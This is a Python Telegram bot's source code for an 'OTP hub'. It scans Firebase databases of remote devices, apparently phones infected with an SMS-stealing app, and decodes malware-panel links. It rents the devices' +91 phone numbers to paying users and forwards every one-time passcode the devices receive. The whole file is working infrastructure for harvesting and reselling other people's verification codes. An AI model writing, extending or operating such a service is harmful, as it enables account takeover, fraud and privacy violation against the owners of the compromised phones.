import asyncio, os, time, logging, random, string
from datetime import datetime
from aiohttp import web
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, CopyTextButton, FSInputFile
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest

import database as db
import firebase_utils as fbu

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("OTP-Bot")

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
MAIN_OWNER = 8480878371
PORT = int(os.getenv("PORT", 8080))

router = Router()
running_bots = {}
active_scans = {}

# ================= STYLING =================
SMALL_CAPS_MAP = str.maketrans(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
    "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ"
)
def sc(text: str) -> str:
    return text.translate(SMALL_CAPS_MAP)

def btn(text: str, callback_data: str, emoji: str = "") -> InlineKeyboardButton:
    label = f"{emoji} {sc(text)}".strip()
    return InlineKeyboardButton(text=label, callback_data=callback_data)

# ================= STATES =================
class S(StatesGroup):
    add_bulk_urls = State()
    add_bot = State()
    add_admin = State()
    add_super_admin = State()
    ban_user = State()
    broadcast = State()
    add_credits_uid = State()
    add_credits_amt = State()
    deduct_credits_uid = State()
    deduct_credits_amt = State()
    support_msg = State()

# ================= HELPERS =================
def is_owner(uid):
    d = db.load_data()
    return uid == d.get("owner_id") or uid in d.get("super_admins", [])

def is_admin(uid):
    d = db.load_data()
    return is_owner(uid) or uid in d.get("admins", [])

def clear_user_lease(uid):
    d = db.load_data()
    if str(uid) in d.get("user_leases", {}):
        del d["user_leases"][str(uid)]
        db.save_data(d)

def get_servers_grouped(data):
    fbs = data.get("firebases", [])
    return [fbs[i:i+25] for i in range(0, len(fbs), 25)]

async def send_otp_to_user(uid, service, otp, msg_text, rent_id):
    otp_msg = (
        f"🔔 <b>{sc('otp received')}!</b>\n\n"
        f"📱 <b>{sc('service')}:</b> {service}\n"
        f"🔑 <b>{sc('otp')}:</b> <code>{otp}</code>\n\n"
        f"🆔 <b>{sc('rent id')}:</b> <code>{rent_id}</code>\n"
        f"💬 <i>{msg_text[:60]}...</i>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"{otp}", copy_text=CopyTextButton(text=otp))]])
    
    d = db.load_data()
    user = d["users"].get(str(uid))
    if user:
        hist = user.setdefault("otp_history", [])
        hist.insert(0, {"service": service, "otp": otp, "time": int(time.time())})
        user["otp_history"] = hist[:20]
        db.save_data(d)
        
    try:
        bot = running_bots.get(BOT_TOKEN)
        if bot: await bot.send_message(uid, otp_msg, reply_markup=kb, parse_mode="HTML")
    except Exception: pass

async def get_latest_msgs(fb_url, auth, limit=5):
    all_msgs = {}
    clients = await fbu.fetch_fb(f"{fb_url}/clients.json", auth)
    if not clients: return all_msgs
    for dev_id in clients.keys():
        msgs = await fbu.fetch_fb(f"{fb_url}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast={limit}", auth)
        if msgs:
            for k, v in msgs.items():
                if isinstance(v, dict) and v.get("type") == "incoming":
                    if int(v.get("id", 0)) > all_msgs.get(dev_id, {}).get("id", 0):
                        all_msgs[dev_id] = v
    return all_msgs

async def background_scanner():
    log.info("Scanner Started...")
    dead_url_tracker = {}
    
    while True:
        try:
            d = db.load_data()
            fbs = d.get("firebases", [])
            leases = d.get("user_leases", {})
            
            device_to_users = {}
            current_time = time.time()
            for uid, lease in leases.items():
                if current_time < lease["expire_at"] and "dev_id" in lease:
                    device_to_users.setdefault(lease["dev_id"], []).append(uid)
            
            # Dead URL Auto-Removal
            active_fbs = []
            for fb in fbs:
                latest = await get_latest_msgs(fb["url"], fb.get("auth"), limit=1)
                has_recent = False
                for dev, msg in latest.items():
                    if fbu.calculate_health([msg]) >= 2:
                        has_recent = True
                        break
                if has_recent:
                    active_fbs.append(fb)
                    dead_url_tracker[fb["url"]] = 0
                else:
                    dead_url_tracker[fb["url"]] = dead_url_tracker.get(fb["url"], 0) + 1
                    if dead_url_tracker[fb["url"]] < 10: # 10 scans (30s) se dead hai toh remove
                        active_fbs.append(fb)
                    else:
                        log.info(f"Auto-removed dead URL: {fb['url']}")
            
            if len(active_fbs) != len(fbs):
                d["firebases"] = active_fbs
                # Auto-arrange labels
                for i, f in enumerate(d["firebases"]):
                    f["label"] = f"Base {i+1}"
                db.save_data(d)

            if device_to_users:
                for fb in active_fbs:
                    latest_msgs = await get_latest_msgs(fb["url"], fb.get("auth"), limit=5)
                    for dev_id, msg in latest_msgs.items():
                        key = (fb["url"], dev_id)
                        msg_id = int(msg.get("id", 0))
                        old_id = active_scans.get(key, 0)
                        if msg_id > old_id:
                            active_scans[key] = msg_id
                            if old_id != 0: 
                                text_content = msg.get("message", "")
                                otp = fbu.extract_otp(text_content)
                                if otp and dev_id in device_to_users:
                                    service = fbu.extract_service_name(text_content, msg.get("sender", ""))
                                    for uid in device_to_users[dev_id]:
                                        await send_otp_to_user(uid, service, otp, text_content, dev_id)
            await asyncio.sleep(3)
        except Exception as e:
            log.error(f"Scanner Error: {e}")
            await asyncio.sleep(5)

# ================= KEYBOARDS =================
def main_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("get number", "user:get_num", "📱"), btn("my numbers", "user:saved", "⭐")],
        [btn("otp history", "user:history", "📜"), btn("help/support", "user:support", "🆘")]
    ])

def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("enter as user", "user:home", "👤"), btn("analytics", "admin:analytics", "📊")],
        [btn("manage servers", "admin:manage_fb", "🔥"), btn("manage bots", "admin:bots", "🤖")],
        [btn("manage admins", "admin:admins", "🛡"), btn("broadcast", "admin:broadcast", "📢")],
        [btn("add credits", "admin:credits:add", "💰"), btn("deduct credits", "admin:credits:deduct", "💸")],
        [btn("view users", "admin:users", "👥"), btn("ban user", "admin:ban", "🚫")],
        [btn("settings", "admin:settings", "⚙️"), btn("refresh panel", "admin:home", "🔄")]
    ])

# ================= HANDLERS =================
@router.message(CommandStart())
async def cmd_start(msg: Message):
    uid = msg.from_user.id
    d = db.load_data()
    clear_user_lease(uid)
    
    if str(uid) not in d["users"]:
        d["users"][str(uid)] = {"name": msg.from_user.full_name, "joined": int(time.time()), "credits": 0, "otp_history": [], "saved_numbers": {}}
        db.save_data(d)
        try: await msg.bot.send_message(MAIN_OWNER, f"🆕 <b>{sc('new user')}</b>\n👤 {msg.from_user.full_name}\n🆔 <code>{uid}</code>", parse_mode="HTML")
        except: pass
    
    if is_admin(uid):
        await admin_home_msg(msg)
    else:
        if uid in d.get("banned", []): return await msg.answer("🚫 You are banned.")
        await msg.answer(f"👋 <b>{sc('welcome to otp hub')}</b>\n{sc('select an option below')}:", reply_markup=main_kb(), parse_mode="HTML")

async def admin_home_msg(msg: Message):
    d = db.load_data()
    fbs = d.get("firebases", [])
    servers = get_servers_grouped(d)
    
    text = (
        f"👑 <b>{sc('owner dashboard')}</b>\n\n"
        f"🔥 {sc('total servers')}: <b>{len(servers)}</b>\n"
        f"📱 {sc('total bases')}: <b>{len(fbs)}</b>\n"
        f"👥 {sc('total users')}: <b>{len(d.get('users', {}))}</b>\n\n"
        f"<b>{sc('server list')}:</b>\n"
    )
    for i, srv in enumerate(servers):
        text += f"📁 Server {i+1} | <b>{len(srv)} Bases</b>\n"
        
    try: await msg.answer(text, reply_markup=admin_kb(), parse_mode="HTML")
    except: pass

@router.callback_query(F.data == "admin:home")
async def admin_home_cb(cq: CallbackQuery):
    try: await cq.message.edit_text("🔄 Refreshing...")
    except: pass
    await admin_home_msg(cq.message)

# ================= ADMIN SERVER MANAGEMENT =================
@router.callback_query(F.data == "admin:manage_fb")
async def admin_manage_fb(cq: CallbackQuery):
    d = db.load_data()
    servers = get_servers_grouped(d)
    kb = []
    for i, srv in enumerate(servers):
        kb.append([btn(f"server {i+1} ({len(srv)} bases)", f"admin:viewfb:{i}", "📁")])
    kb.append([btn("add bulk urls", "admin:add_bulk", "➕")])
    kb.append([btn("back", "admin:home", "🔙")])
    
    try: await cq.message.edit_text(f"🔥 <b>{sc('manage servers')}</b>\n\n{sc('select server or add urls')}:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except: pass

@router.callback_query(F.data.startswith("admin:viewfb:"))
async def admin_viewfb(cq: CallbackQuery):
    idx = int(cq.data.split(":")[2])
    d = db.load_data()
    servers = get_servers_grouped(d)
    srv = servers[idx]
    
    try: await cq.message.edit_text("🔄 Fetching...")
    except: pass
    
    text = f"📁 <b>Server {idx+1} Bases</b>\n\n"
    kb = []
    for i, fb in enumerate(srv):
        clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
        online = sum(1 for c in clients.values() if isinstance(c, dict) and c.get("status")) if clients else 0
        text += f"Base {i+1}: 🟢 {online} Online\n🔗 <code>{fb['url']}</code>\n\n"
        kb.append([btn(f"remove base {i+1}", f"admin:rmfb:{idx}:{i}", "🗑")])
        
    kb.append([btn("back", "admin:manage_fb", "🔙")])
    try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except: pass

@router.callback_query(F.data.startswith("admin:rmfb:"))
async def admin_rmfb(cq: CallbackQuery):
    parts = cq.data.split(":")
    srv_idx, base_idx = int(parts[2]), int(parts[3])
    d = db.load_data()
    
    servers = get_servers_grouped(d)
    if srv_idx < len(servers) and base_idx < len(servers[srv_idx]):
        fb_to_remove = servers[srv_idx][base_idx]
        d["firebases"] = [f for f in d["firebases"] if f["url"] != fb_to_remove["url"]]
        
        # Auto-arrange
        for i, f in enumerate(d["firebases"]):
            f["label"] = f"Base {i+1}"
        db.save_data(d)
        await cq.answer("✅ Base removed & auto-arranged!")
    await admin_manage_fb(cq)

@router.callback_query(F.data == "admin:add_bulk")
async def admin_add_bulk(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.add_bulk_urls)
    await cq.message.edit_text(f"📁 <b>{sc('bulk add urls')}</b>\n\n{sc('send urls one per line')}:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("cancel", "admin:manage_fb", "❌")]]))

@router.message(S.add_bulk_urls)
async def admin_add_bulk_done(msg: Message, state: FSMContext):
    await state.clear()
    d = db.load_data()
    added = 0
    for line in msg.text.strip().split("\n"):
        url = line.strip()
        if not url: continue
        if "#DARKs=" in url or "?s=" in url:
            dec = fbu.decode_panel_url(url)
            if dec: url = dec[0]
        if url.startswith("http"):
            d["firebases"].append({"url": url, "label": "Base", "auth": ""})
            added += 1
    # Auto-arrange
    for i, f in enumerate(d["firebases"]):
        f["label"] = f"Base {i+1}"
    db.save_data(d)
    await msg.answer(f"✅ {added} Bases added & auto-arranged!", reply_markup=admin_kb())

# ================= USER FLOW =================
@router.callback_query(F.data == "user:home")
async def user_home(cq: CallbackQuery):
    clear_user_lease(cq.from_user.id)
    try: await cq.message.edit_text(f"👋 <b>{sc('main menu')}</b>", reply_markup=main_kb(), parse_mode="HTML")
    except: pass

@router.callback_query(F.data == "user:get_num")
async def user_get_num(cq: CallbackQuery):
    clear_user_lease(cq.from_user.id)
    d = db.load_data()
    servers = get_servers_grouped(d)
    if not servers: return await cq.answer("No servers available.")
    
    kb = []
    for i, _ in enumerate(servers):
        ping = await fbu.check_ping(servers[i][0]["url"])
        kb.append([btn(f"server {i+1} ({ping})", f"server_sel:{i}", "🌍")])
    kb.append([btn("main menu", "user:home", "🏠")])
    
    try: await cq.message.edit_text(f"🌍 <b>{sc('select server')}:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except: pass

@router.callback_query(F.data.startswith("server_sel:"))
async def user_server_selected(cq: CallbackQuery):
    idx = int(cq.data.split(":")[1])
    uid = cq.from_user.id
    clear_user_lease(uid)
    
    d = db.load_data()
    servers = get_servers_grouped(d)
    if idx >= len(servers): return await cq.answer("Server not found!")
    
    try: await cq.message.edit_text(f"🔄 {sc('fetching fresh number')}...")
    except: pass
    
    used = d.setdefault("used_devices", {}).setdefault(str(uid), {})
    now = int(time.time())
    
    available, repeat, all_devs = [], [], []
    
    for fb_i, fb in enumerate(servers[idx]):
        clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
        if not clients: continue
        for dev_id, c in clients.items():
            if isinstance(c, dict) and c.get("status") is True:
                all_devs.append((fb_i, fb, dev_id, c))
                last_used = used.get(dev_id, 0)
                if now - last_used > 86400: available.append((fb_i, fb, dev_id, c))
                elif now - last_used > 43200: repeat.append((fb_i, fb, dev_id, c))
    
    is_rep = False
    if available: fb_i, fb, dev_id, dev_data = random.choice(available)
    elif repeat: fb_i, fb, dev_id, dev_data = random.choice(repeat); is_rep = True
    elif all_devs: fb_i, fb, dev_id, dev_data = random.choice(all_devs); is_rep = True
    else: return await cq.answer("❌ No online lines in this server.", show_alert=True)
        
    used[dev_id] = now
    data = db.load_data()
    data["used_devices"][str(uid)] = used
    
    msgs_dict = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=50", fb.get("auth"))
    msgs = [v for k, v in msgs_dict.items() if isinstance(v, dict) and v.get("type") == "incoming"] if msgs_dict else []
    
    if msgs:
        active_scans[(fb['url'], dev_id)] = max(int(m.get("id", 0)) for m in msgs)
    
    best_nums = fbu.extract_best_numbers(dev_data, msgs)
    health = fbu.calculate_health(msgs)
    
    base_label = fb.get("label", f"Base {fb_i+1}")
    
    data["user_leases"][str(uid)] = {
        "dev_id": dev_id, "fb_url": fb["url"], "base_idx": base_label, "numbers": [n for n, c in best_nums],
        "expire_at": int(time.time()) + 3600, "health": health
    }
    db.save_data(data)
    
    rep_mark = " #" if is_rep else ""
    nums_text = ""
    kb_nums = []
    
    if best_nums:
        for n, c in best_nums:
            nums_text += f"📞 <code>+91{n}</code> | {base_label}\n"
            kb_nums.append([InlineKeyboardButton(text=f"📋 Copy +91{n}", copy_text=CopyTextButton(text=f"+91{n}"))])
    else:
        nums_text = f"⚠️ <b>{sc('sim active. otp aate hi number update hoga')}.</b>"
        
    battery = str(dev_data.get("battery", "100")).replace("%", "")
    if not battery or battery == "?": battery = "100"
    
    text = (
        f"📱 <b>{sc('number details')}</b>\n"
        f"🔥 {sc('server')}: {idx+1} | {base_label}\n"
        f"🆔 {sc('rent id')}: <code>{dev_id}</code>{rep_mark}\n"
        f"⚙️ {sc('code')}: <code>{battery}T</code>\n"
        f"❤️ {sc('health')}: <b>{health}/10</b>\n\n"
        f"{nums_text}\n"
        f"⌛ <i>{sc('waiting for otp (1 hour)')}...</i>"
    )
    
    kb = kb_nums + [
        [InlineKeyboardButton(text="📋 Copy Rent ID", copy_text=CopyTextButton(text=dev_id))],
        [btn("info", f"info:{dev_id}", "ℹ️"), btn("save number", f"save:{dev_id}", "⭐")],
        [btn("next number", f"server_sel:{idx}", "🔄"), btn("stop", "stop_listen", "⏹")],
        [btn("back", "user:get_num", "🔙")]
    ]
    
    try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except: pass

@router.callback_query(F.data.startswith("info:"))
async def show_info(cq: CallbackQuery):
    dev_id = cq.data.split(":")[1]
    d = db.load_data()
    lease = d.get("user_leases", {}).get(str(cq.from_user.id), {})
    if not lease or lease.get("dev_id") != dev_id:
        return await cq.answer("Lease expired!", show_alert=True)
        
    info_text = (
        f"ℹ️ <b>{sc('device information')}</b>\n\n"
        f"🆔 <b>{sc('rent id')}:</b> <code>{dev_id}</code>\n"
        f"📁 <b>{sc('base')}:</b> {lease.get('base_idx', 'Unknown')}\n"
        f"❤️ <b>{sc('health')}:</b> {lease.get('health')}/10\n"
        f"🔗 <b>{sc('source url')}:</b>\n<code>{lease.get('fb_url', 'Unknown')}</code>"
    )
    await cq.answer(info_text, show_alert=True)

@router.callback_query(F.data.startswith("save:"))
async def save_number(cq: CallbackQuery):
    dev_id = cq.data.split(":")[1]
    uid = cq.from_user.id
    d = db.load_data()
    lease = d.get("user_leases", {}).get(str(uid), {})
    
    if not lease or lease.get("dev_id") != dev_id:
        return await cq.answer("❌ Lease expired!")
        
    nums = lease.get("numbers", [])
    save_key = nums[0] if nums else dev_id
    base_label = lease.get("base_idx", "Base ?")
    
    user = d["users"].setdefault(str(uid), {})
    saved = user.setdefault("saved_numbers", {})
    
    saved[save_key] = {
        "dev_id": dev_id, "fb_url": lease["fb_url"], "base_idx": base_label,
        "health": lease.get("health"), "time": int(time.time())
    }
    db.save_data(d)
    await cq.answer("⭐ Saved to My Numbers!")

@router.callback_query(F.data == "user:saved")
async def my_numbers(cq: CallbackQuery):
    uid = cq.from_user.id
    d = db.load_data()
    saved = d.get("users", {}).get(str(uid), {}).get("saved_numbers", {})
    
    if not saved:
        return await cq.message.edit_text("⭐ <b>My Numbers</b>\n\nNo saved numbers.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("main menu", "user:home", "🏠")]]), parse_mode="HTML")
        
    kb = []
    for key, info in saved.items():
        disp = f"+91{key}" if len(key) == 10 else key
        kb.append([btn(f"{disp} | {info.get('base_idx', '')}", f"access:{key}", "📞")])
    kb.append([btn("main menu", "user:home", "🏠")])
    
    await cq.message.edit_text("⭐ <b>My Numbers</b>\nTap to re-access:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

@router.callback_query(F.data.startswith("access:"))
async def access_saved(cq: CallbackQuery):
    key = cq.data.split(":")[1]
    uid = cq.from_user.id
    d = db.load_data()
    saved = d.get("users", {}).get(str(uid), {}).get("saved_numbers", {})
    
    if key not in saved: return await cq.answer("Not found!")
    info = saved[key]
    
    if time.time() - info["time"] > 86400:
        del saved[key]
        db.save_data(d)
        return await cq.answer("❌ 24 hours complete. Number expired.", show_alert=True)
        
    dev_id = info["dev_id"]
    fb_url = info["fb_url"]
    
    clients = await fbu.fetch_fb(f"{fb_url}/clients.json")
    is_online = clients and dev_id in clients and clients[dev_id].get("status") is True
    
    if not is_online:
        # ONLY offline check, no health check
        return await cq.answer("❌ Device offline or removed. Not in range, try after some time.", show_alert=True)
        
    d["user_leases"][str(uid)] = {
        "dev_id": dev_id, "fb_url": fb_url, "base_idx": info.get("base_idx", "Unknown"), "numbers": [key] if len(key)==10 else [], "expire_at": int(time.time()) + 3600, "health": info.get("health", 5)
    }
    db.save_data(d)
    
    text = (
        f"📱 <b>{sc('re-accessed device')}</b>\n"
        f"🆔 {sc('rent id')}: <code>{dev_id}</code>\n"
        f"📁 {sc('base')}: {info.get('base_idx', 'Unknown')}\n"
        f"📞 {sc('number')}: <code>+91{key}</code>\n\n"
        f"⌛ <i>{sc('waiting for otp (1 hour)')}...</i>"
    )
    kb = [
        [InlineKeyboardButton(text="📋 Copy Rent ID", copy_text=CopyTextButton(text=dev_id))],
        [btn("stop", "stop_listen", "⏹")],
        [btn("main menu", "user:home", "🏠")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

@router.callback_query(F.data == "stop_listen")
async def stop_listening(cq: CallbackQuery):
    clear_user_lease(cq.from_user.id)
    await cq.answer("⏹ Stopped.", show_alert=True)
    await user_home(cq)

# ================= EXTRA ADMIN FEATURES =================
@router.callback_query(F.data == "admin:analytics")
async def admin_analytics(cq: CallbackQuery):
    d = db.load_data()
    leases = d.get("user_leases", {})
    text = "📊 <b>Active Rent IDs</b>\n\n"
    for uid, l in leases.items():
        if time.time() < l["expire_at"]:
            text += f"👤 <code>{uid}</code> | 🆔 <code>{l['dev_id']}</code> | {l.get('base_idx')}\n"
    if len(text) == 26: text += "No active leases."
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("back", "admin:home", "🔙")]]), parse_mode="HTML")

@router.callback_query(F.data == "user:support")
async def user_support(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.support_msg)
    await cq.message.edit_text("🆘 <b>Support</b>\n\nType your message for owner:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("cancel", "user:home", "❌")]]), parse_mode="HTML")

@router.message(S.support_msg)
async def support_msg_sent(msg: Message, state: FSMContext):
    await state.clear()
    try:
        await msg.bot.send_message(MAIN_OWNER, f"🆘 <b>Support Msg</b>\nFrom: <code>{msg.from_user.id}</code>\n\n{msg.text}", parse_mode="HTML")
        await msg.answer("✅ Message sent to owner!", reply_markup=main_kb())
    except: await msg.answer("❌ Failed to send.")

# ================= MAIN =================
async def main():
    log.info("Starting Bot...")
    app = web.Application()
    app.router.add_get('/', lambda r: web.Response(text="Bot Running!"))
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, '0.0.0.0', PORT).start()
    
    bot = Bot(token=BOT_TOKEN)
    running_bots[BOT_TOKEN] = bot
    asyncio.create_task(background_scanner())
    
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
